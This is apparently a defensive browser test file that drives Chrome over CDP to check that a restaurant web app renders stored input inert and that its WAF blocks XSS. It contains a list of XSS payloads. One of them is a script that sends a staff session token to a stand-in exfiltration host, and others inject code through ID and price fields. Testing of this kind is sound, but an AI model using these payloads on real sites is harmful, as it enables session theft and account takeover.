// Real Chrome rendering + real WSGI/PolicyStore/Flask, disposable database only.
// Start: python -m waf.tests.browser_wsgi_fixture --restaurant
// Start isolated Chrome CDP on 9222, then: node waf/tests/browser_restaurant.mjs
// All page/API/image requests are intercepted; production URLs are NEVER forwarded.
import assert from 'node:assert/strict';
import {readFileSync} from 'node:fs';

const apiOrigin = 'http://127.0.0.1:8765';
const hosted = process.argv.includes('--hosted');
const frontOrigin = hosted ? apiOrigin : 'http://127.0.0.1:8767';
const files = new Map(['index.html', 'admin.html', 'kitchen.html', 'restaurant-dom.js', ...['index', 'admin', 'kitchen'].flatMap(page => [`restaurant-${page}.js`, `restaurant-${page}.css`])].map(file =>
  ['/' + file, readFileSync(new URL('../../' + file, import.meta.url), 'utf8')]));
const target = await fetch('http://127.0.0.1:9222/json/new?about:blank', {method: 'PUT'}).then(r => r.json());
const socket = new WebSocket(target.webSocketDebuggerUrl);
await new Promise((resolve, reject) => { socket.addEventListener('open', resolve, {once: true}); socket.addEventListener('error', reject, {once: true}); });
let sequence = 0, passed = 0, intercepted = 0;
const pending = new Map(), errors = [], unexpected = [], orderBodies = [];
const allowedHeaders = new Set(['origin', 'authorization', 'content-type', 'accept',
  'access-control-request-method', 'access-control-request-headers']);
function command(method, params = {}) {
  return new Promise((resolve, reject) => {
    const id = ++sequence;
    const timer = setTimeout(() => { pending.delete(id); reject(Error('CDP timeout: ' + method)); }, 15000);
    pending.set(id, {resolve, reject, timer}); socket.send(JSON.stringify({id, method, params}));
  });
}
socket.addEventListener('close', () => {
  for (const call of pending.values()) { clearTimeout(call.timer); call.reject(Error('Browser closed')); }
  pending.clear();
});
async function fulfill(event, body, type, headers = []) {
  await command('Fetch.fulfillRequest', {requestId: event.requestId, responseCode: 200,
    responseHeaders: [{name: 'Content-Type', value: type}, ...headers], body: Buffer.from(body).toString('base64')});
}
async function intercept(event) {
  intercepted++;
  const url = new URL(event.request.url);
  if (url.origin === frontOrigin && files.has(url.pathname)) {
    if (hosted) {
      const response = await fetch(apiOrigin + url.pathname);
      assert.equal(response.status, 200);
      if (url.pathname.endsWith('.html')) assert.ok(response.headers.get('content-security-policy')?.includes("script-src 'self'"));
      return command('Fetch.fulfillRequest', {requestId:event.requestId, responseCode:response.status,
        responseHeaders:[...response.headers].filter(([name]) => !['content-length','connection','transfer-encoding'].includes(name)).map(([name,value]) => ({name,value})),
        body:Buffer.from(await response.arrayBuffer()).toString('base64')});
    }
    // Static Pages compatibility also proves rendering safety without CSP.
    return fulfill(event, files.get(url.pathname), url.pathname.endsWith('.js') ? 'text/javascript' : url.pathname.endsWith('.css') ? 'text/css' : 'text/html; charset=utf-8');
  }
  if ((url.origin === 'https://kali.pythonanywhere.com' || hosted && url.origin === apiOrigin) && url.pathname.startsWith('/api/')) {
    const headers = Object.fromEntries(Object.entries(event.request.headers).filter(([name]) => allowedHeaders.has(name.toLowerCase())));
    const body = ['GET', 'HEAD', 'OPTIONS'].includes(event.request.method) ? undefined : event.request.postData;
    if (url.pathname === '/api/orders' && event.request.method === 'POST') orderBodies.push(JSON.parse(body));
    const result = await fetch(apiOrigin + url.pathname + url.search, {method: event.request.method, headers, body, redirect: 'manual'});
    const responseHeaders = [...result.headers].filter(([name]) => !['content-length', 'connection', 'transfer-encoding', 'content-encoding'].includes(name))
      .map(([name, value]) => ({name, value}));
    return command('Fetch.fulfillRequest', {requestId: event.requestId, responseCode: result.status,
      responseHeaders, body: Buffer.from(await result.arrayBuffer()).toString('base64')});
  }
  if (url.origin === 'https://images.unsplash.com') {
    return fulfill(event, Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+aM1cAAAAASUVORK5CYII=', 'base64'), 'image/png');
  }
  if (url.origin === frontOrigin && url.pathname === '/favicon.ico') return fulfill(event, '', 'image/x-icon');
  unexpected.push(url.origin + url.pathname);
  return command('Fetch.failRequest', {requestId: event.requestId, errorReason: 'BlockedByClient'});
}
socket.addEventListener('message', ({data}) => {
  const message = JSON.parse(data);
  if (message.id) {
    const call = pending.get(message.id); pending.delete(message.id);
    if (call) { clearTimeout(call.timer); message.error ? call.reject(Error(JSON.stringify(message.error))) : call.resolve(message.result); }
  }
  if (message.method === 'Runtime.exceptionThrown') errors.push(message.params.exceptionDetails.text);
  if (message.method === 'Page.javascriptDialogOpening') {
    if (message.params.message.includes('stored-xss-executed')) errors.push('Injected dialog executed');
    command('Page.handleJavaScriptDialog', {accept: true}).catch(error => errors.push(error.message));
  }
  if (message.method === 'Fetch.requestPaused') intercept(message.params).catch(async error => {
    errors.push(error.message);
    await command('Fetch.failRequest', {requestId: message.params.requestId, errorReason: 'Failed'}).catch(() => {});
  });
});
async function evaluate(expression) {
  const result = await command('Runtime.evaluate', {expression, returnByValue: true, awaitPromise: true});
  if (result.exceptionDetails) throw Error(JSON.stringify(result.exceptionDetails));
  return result.result.value;
}
async function waitFor(expression) {
  const deadline = Date.now() + 15000;
  while (Date.now() < deadline) {
    if (await evaluate(expression)) return;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  throw Error('Timed out: ' + expression);
}
async function navigate(file, ready) {
  await command('Page.navigate', {url: frontOrigin + '/' + file});
  await waitFor(`location.pathname === ${JSON.stringify('/' + file)} && document.readyState === 'complete' && (${ready})`);
}
function pass(message) { passed++; process.stdout.write('PASS ' + message + '\n'); }
async function staffLogin(role) {
  await evaluate(`document.getElementById('username').value=${JSON.stringify('synthetic-browser-' + role)};
    document.getElementById('password').value='synthetic-browser-staff-password'; login()`);
  await waitFor(`document.getElementById(${JSON.stringify(role === 'admin' && (await evaluate('typeof loadAdminMenu')) === 'function' ? 'adminPanel' : 'kitchenPanel')}).style.display === 'block'`);
}
let operatorCookie;
async function operator(path, method = 'GET', body, csrf) {
  const response = await fetch(apiOrigin + path, {method, redirect: 'manual', headers: {
    Cookie: operatorCookie, ...(body ? {'Content-Type': 'application/json', 'X-CSRF-Token': csrf} : {}),
  }, body: body ? JSON.stringify(body) : undefined});
  assert.equal(response.status, 200, path); return response.json();
}
async function policy(changes) {
  const state = await operator('/waf-api/settings');
  return operator('/waf-api/settings', 'PUT', {revision: state.revision, policy: {...state.policy, ...changes}}, state.csrf_token);
}
async function safeRendering() {
  await new Promise(resolve => setTimeout(resolve, 50));
  assert.equal(await evaluate('window.__storedXSS === undefined'), true);
  assert.equal(await evaluate(`document.querySelectorAll('.menu-item script, .menu-item svg, .menu-item iframe, .menu-item [onerror], .menu-row [onclick], .order-card [onclick], .archive-item script').length`), 0);
  assert.deepEqual(unexpected, []); assert.deepEqual(errors, []);
}
const payloads = [
  '</p><img src="/xss-probe" onerror="window.__storedXSS=1">',
  '<script>window.__storedXSS=1;fetch("https://exfil.invalid/?token="+sessionStorage.getItem("staffToken"))</script>',
  '<svg onload="window.__storedXSS=1"></svg>',
  '" autofocus onfocus="window.__storedXSS=1" x="',
  '&lt;img src=x onerror=window.__storedXSS=1&gt;',
  'Қазақша 🧀 \u2028 </p><iframe srcdoc="<script>parent.__storedXSS=1</script>"></iframe>',
];
try {
  // Operator login uses only the local fixture and disposable credentials.
  const loginPage = await fetch(apiOrigin + '/dashboard/login');
  const csrf = /name="csrf_token" value="([^"]+)"/.exec(await loginPage.text())[1];
  const csrfCookie = loginPage.headers.getSetCookie().map(value => value.split(';')[0]).join('; ');
  const login = await fetch(apiOrigin + '/dashboard/login', {method: 'POST', redirect: 'manual',
    headers: {'Content-Type': 'application/x-www-form-urlencoded', Cookie: csrfCookie},
    body: new URLSearchParams({username: 'synthetic-operator', password: 'synthetic-browser-password', csrf_token: csrf})});
  assert.equal(login.status, 303);
  operatorCookie = login.headers.getSetCookie().find(value => value.startsWith('chillibek_waf_session=')).split(';')[0];
  await policy({xss: false});
  await command('Page.enable'); await command('Runtime.enable');
  await command('Fetch.enable', {patterns: [{urlPattern: '*', requestStage: 'Request'}]});
  await navigate('admin.html', 'typeof login === "function"');
  await staffLogin('admin'); await waitFor('globalMenuData.length === 15');
  const legacy = await evaluate('globalMenuData.find(item => item.name.startsWith("Legacy "))');
  assert.equal(await evaluate(`document.querySelector('.menu-row h4').textContent.length > 0`), true);
  await safeRendering(); pass('Existing legacy menu markup and unsafe image URL remain inert in admin');
  const saved = [];
  for (const [index, description] of payloads.entries()) {
    const name = index === 2 ? 'Browser <img src=x onerror="window.__storedXSS=1">' : 'Browser XSS ' + index;
    await evaluate(`document.getElementById('newCat').value='snacks'; document.getElementById('newName').value=${JSON.stringify(name)};
      document.getElementById('newDesc').value=${JSON.stringify(description)};document.getElementById('newWeight').value='100g';
      document.getElementById('newPrice').value='1000';document.getElementById('newImg').value='https://images.unsplash.com/browser';validateAndAdd()`);
    await waitFor(`globalMenuData.some(item => item.description === ${JSON.stringify(description)})`);
    saved.push(await evaluate(`globalMenuData.find(item => item.description === ${JSON.stringify(description)})`));
    await safeRendering();
  }
  pass('Admin UI stores six payload variants with XSS OFF without executing them');
  await evaluate(`handleSearch('Browser'); document.querySelector('.search-result-item').click()`);
  assert.equal(await evaluate(`document.getElementById('editDesc').value`), saved[0].description);
  saved[0].description += ' edited';
  await evaluate(`document.getElementById('editDesc').value=${JSON.stringify(saved[0].description)};saveEdit()`);
  await waitFor(`globalMenuData.find(item => item.id === ${saved[0].id}).description === ${JSON.stringify(saved[0].description)}`);
  await safeRendering(); pass('Search, edit modal and saved descriptions remain literal text');
  await policy({xss: true});
  const blocked = await fetch(apiOrigin + '/api/menu?probe=' + encodeURIComponent('<svg onload=alert(1)>'));
  assert.equal(blocked.status, 403);
  const detected = await operator('/dashboard/api/events?rule_id=XSS-001');
  assert.ok(detected.events.some(event => event.decision === 'blocked' && event.status_code === 403));
  await navigate('index.html', 'typeof renderMenu === "function" && document.querySelectorAll(".menu-item").length === 21');
  const records = [legacy, ...saved];
  for (const record of records) {
    assert.equal(await evaluate(`document.getElementById('btn-container-${record.id}').closest('.menu-item').querySelector('.item-desc').textContent`), record.description);
    await evaluate(`document.getElementById('btn-container-${record.id}').closest('.menu-item').querySelector('.item-desc').click()`);
    assert.equal(await evaluate(`document.getElementById('detailsDesc').textContent`), record.description);
  }
  assert.equal(await evaluate(`document.getElementById('btn-container-${legacy.id}').closest('.menu-item').querySelector('img').hasAttribute('src')`), false);
  await safeRendering(); pass(`Stored payloads stay inert in menu cards and details with XSS ON; CSP ${hosted ? 'enforced' : 'absent'}`);
  const purchased = saved[2];
  await evaluate(`closeDetails();document.getElementById('btn-container-${purchased.id}').querySelector('button').click()`);
  assert.equal(await evaluate(`document.querySelector('.cart-item-name').textContent`), purchased.name);
  await evaluate(`document.getElementById('tableSelect').value='1';submitOrder()`);
  await waitFor(`Object.keys(cart).length === 0`);
  assert.equal(orderBodies.length, 1); assert.deepEqual(orderBodies[0].items, [{id: purchased.id, qty: 1}]);
  await safeRendering(); pass('Ordering a stored malicious name works with XSS ON; client sends IDs/quantities only');
  await navigate('kitchen.html', 'typeof renderOrders === "function"');
  await staffLogin('waiter'); await waitFor(`document.querySelector('#list-pending .order-card') !== null`);
  assert.ok((await evaluate(`document.querySelector('#list-pending').textContent`)).includes(purchased.name));
  await safeRendering();
  await evaluate(`document.querySelector('#list-pending .btn-confirm').click()`);
  await waitFor(`document.querySelector('#list-cooking .order-card') !== null`);
  await evaluate('logout()'); await staffLogin('chef');
  await waitFor(`document.querySelector('#list-cooking .btn-cooking') !== null`);
  await evaluate(`document.querySelector('#list-cooking .btn-cooking').click()`);
  await waitFor(`document.querySelector('#list-ready .order-card') !== null`);
  await evaluate('logout()'); await staffLogin('waiter');
  await waitFor(`document.querySelector('#list-ready .btn-ready') !== null`);
  await evaluate(`document.querySelector('#list-ready .btn-ready').click()`);
  await waitFor(`document.querySelectorAll('.order-card').length === 0`);
  await evaluate('openArchive()'); await waitFor(`document.querySelector('.archive-item') !== null`);
  assert.ok((await evaluate(`document.getElementById('archiveList').textContent`)).includes(purchased.name));
  await safeRendering(); pass('Waiter/chef transitions, timers and archive work with stored markup rendered inert');
  await navigate('index.html', 'document.querySelectorAll(".menu-item").length === 21');
  const maliciousType = {...purchased, id: '1);window.__storedXSS=1;//'};
  const maliciousPrice = {...purchased, id: 999, price: '<svg onload=alert(1)>'};
  await evaluate(`menuData=${JSON.stringify([maliciousType, maliciousPrice])};renderMenu()`);
  assert.equal(await evaluate(`document.querySelectorAll('.menu-item').length`), 0);
  await safeRendering(); pass('Malformed API IDs/prices cannot create executable HTML or actions');
  await navigate('admin.html', 'typeof loadAdminMenu === "function"');
  await staffLogin('admin'); await waitFor('globalMenuData.length === 21');
  await evaluate(`document.querySelectorAll('.menu-row')[0] !== null && deleteItem(${saved[0].id})`);
  await waitFor(`!globalMenuData.some(item => item.id === ${saved[0].id})`);
  await evaluate('logout()'); assert.equal(await evaluate(`sessionStorage.getItem('staffToken')`), null);
  await safeRendering(); pass('Menu deletion and logout still work; no injected execution or outbound probe');
  process.stdout.write(`${passed} restaurant browser checks passed; ${intercepted} requests intercepted, none forwarded to production.\n`);
} finally {
  await policy({xss: true}).catch(() => {});
  await command('Browser.close').catch(() => {}); socket.close();
}
